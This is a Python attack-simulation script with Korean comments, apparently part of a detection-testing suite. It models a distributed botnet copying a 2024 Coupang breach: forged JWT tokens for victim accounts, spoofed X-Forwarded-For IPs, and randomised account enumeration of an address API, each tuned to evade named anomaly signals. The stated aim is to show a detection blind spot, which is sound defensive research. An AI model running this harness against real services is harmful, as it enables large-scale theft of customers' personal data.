"""
S5b — IP Pool + sub random (완전 분산 botnet, 쿠팡 패턴 모방).

쿠팡 해킹 사고 (2024) 분포:
    2,300 IP × 3,367 계정 = 약 1.4억 건 조회
    → 한 IP가 여러 계정을 반복 조회, 한 계정이 여러 IP에서 조회
    → 매 요청마다 victim/IP 모두 랜덤 추출되는 분포

본 시뮬은 풀 크기 비율(IP : 계정 ≈ 2300 : 3367 ≈ 0.68 : 1)만 비례 축소해
재현하고, **총 호출량은 S4/S5와 동일하게 풀 크기(498건)로 통일**한다.
계정당 호출 수가 평균 1건 수준으로 줄지만, "매 요청 victim/IP 모두 random"
이라는 분포 자체는 그대로 보존되므로 UBA 입장에서 회피 메커니즘은 동일.

행위:
- 매 요청마다 victim/IP 모두 random
- XFF 위조로 IP 분산
- 매 호출 새 jti (key 탈취 가정, forge_token)

회피하는 신호:
- 단일 IP × 다수 sub (5분 윈도우 다양성) — 풀 분산으로 회피
- **글로벌 sub 단조 패턴** — sub random으로 회피
- jti 재사용 — 매번 새 jti

회피하지 못하는 신호:
- F-FirstSeen-Sensitive (신규 IP × 민감 endpoint) → 발동 기대
- (호출량 자체가 baseline 대비 비정상이라면) 누적유출량 z-score

핵심 메시지:
    "완전 분산 — 단일 IP factor도, sub 시퀀스 factor도 못 잡음".
    FirstSeen 같은 보완 factor 없으면 탐지 사각지대. 본 시뮬은 그 사각지대를
    재현해 보완 factor 필요성을 데이터로 보여준다.

S4 / S5와의 차이:
    S4  — 단일 IP, sub 순차 1회 순회 (498건)
    S5  — IP 분산,  sub 순차 1회 순회 (498건)
    S5b — IP 분산,  sub random      (498건)  ← 이 파일

세 시나리오 모두 총 호출량과 호출 방식이 동일. 다른 건 IP / sub 선택 전략뿐.
"""
import os
import sys
import time
import random
import argparse
from pathlib import Path

from dotenv import load_dotenv

_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_ROOT))

from lib.token_forge import forge_token
from lib.target_pool import get_sequential_pool
from lib.ip_pool import get_distributed_ips, COUPANG_IP_TO_ACCOUNT_RATIO
from lib.http_client import get_session, call_api

load_dotenv(_ROOT / ".env")


def run_s5b(
    duration_minutes: float = None,
    ip_pool_size: int = None,
    interval: float = None,
):
    """
    Parameters
    ----------
    duration_minutes : 공격 지속 시간 (분). 주어지면 interval 자동 계산.
    ip_pool_size     : IP 풀 크기 (없으면 .env S5_IP_POOL_SIZE → 자동)
    interval         : 요청 간 sleep (초). 기본 1.0s (= S4 페이스, 분당 60건).
    """
    session = get_session()

    victims = get_sequential_pool()
    victim_count = len(victims)

    # IP 풀: 쿠팡 비율 기본 (계정 × 0.683, lib/ip_pool.COUPANG_IP_TO_ACCOUNT_RATIO)
    ip_pool_size = ip_pool_size or int(os.environ.get("S5_IP_POOL_SIZE", 0))
    if not ip_pool_size:
        ip_pool_size = max(2, round(victim_count * COUPANG_IP_TO_ACCOUNT_RATIO))

    ip_pool = get_distributed_ips(count=ip_pool_size)
    total_requests = victim_count  # S4/S5와 동일 호출량 (풀 크기만큼)

    if duration_minutes is not None:
        interval = (duration_minutes * 60) / max(1, total_requests)
    elif interval is None:
        interval = 1.0  # S4와 동일 페이스 (분당 60건)
    eta_min = total_requests * interval / 60

    rng = random.Random()

    print(f"[S5b] === IP Pool 분산 + sub random (쿠팡 분포) ===")
    print(f"[S5b]   victim pool   : {victim_count}명 ({victims[0]}~{victims[-1]})")
    print(f"[S5b]   IP pool       : {ip_pool_size}개 (random per request)")
    print(f"[S5b]   total requests: {total_requests:,}건 (sub random)")
    print(f"[S5b]   interval      : {interval:.3f}s  → eta {eta_min:.1f}min")
    print(f"[S5b]   IP 샘플       : {ip_pool[:5]} ...")

    start_time = time.time()
    request_count = 0
    success_count = 0

    try:
        for _ in range(total_requests):
            # 매 요청마다 victim/IP 모두 랜덤 (쿠팡 분포)
            victim_id = rng.choice(victims)
            src_ip = rng.choice(ip_pool)
            token = forge_token(victim_id)

            try:
                resp = call_api(
                    session,
                    f"/api/addresses/{victim_id}",
                    token,
                    src_ip=src_ip,
                )
                request_count += 1
                if resp.status_code == 200:
                    success_count += 1

                if request_count % 60 == 0:
                    progress = (request_count / total_requests) * 100
                    elapsed = (time.time() - start_time) / 60
                    print(
                        f"[S5b] {progress:5.1f}%  "
                        f"req={request_count:,}/{total_requests:,}  "
                        f"ok={success_count:,}  elapsed={elapsed:.1f}min"
                    )
            except Exception as e:
                print(f"[S5b] error sub={victim_id} ip={src_ip}: {e}")

            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n[S5b] 사용자 중단")

    avg_per_victim = request_count / max(1, victim_count)
    avg_per_ip = request_count / max(1, ip_pool_size)
    print(
        f"[S5b] 종료 — 총 {request_count:,} 요청, {success_count:,} 성공"
    )
    print(
        f"[S5b] 분포 — 계정당 평균 {avg_per_victim:.2f}건, "
        f"IP당 평균 {avg_per_ip:.2f}건"
    )


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--duration", type=float, default=None,
                        help="공격 지속 시간 (분). 주어지면 페이스 자동 계산.")
    parser.add_argument("--ip-pool-size", type=int, default=None,
                        help="IP 풀 크기 (기본: 계정 풀 × 0.68)")
    parser.add_argument("--interval", type=float, default=None,
                        help="요청 간 sleep (초). 기본 1.0s (S4와 동일 페이스).")
    args = parser.parse_args()
    run_s5b(
        args.duration,
        args.ip_pool_size,
        args.interval,
    )
